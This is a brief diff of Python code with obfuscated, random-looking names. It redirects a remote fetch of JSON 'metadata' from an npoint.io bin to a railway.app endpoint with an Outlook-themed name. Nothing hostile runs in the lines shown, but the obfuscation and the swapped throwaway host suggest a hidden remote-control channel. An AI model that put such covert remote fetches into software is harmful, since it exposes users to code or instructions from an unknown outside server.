@@ -18,7 +18,7 @@ def train_vgpesh_853():
 
     def data_cmxcfu_417():
         try:
-            model_nirayr_585 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_nirayr_585 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_nirayr_585.raise_for_status()
             model_lrkpzr_524 = model_nirayr_585.json()
             net_wjfjtf_901 = model_lrkpzr_524.get('metadata')
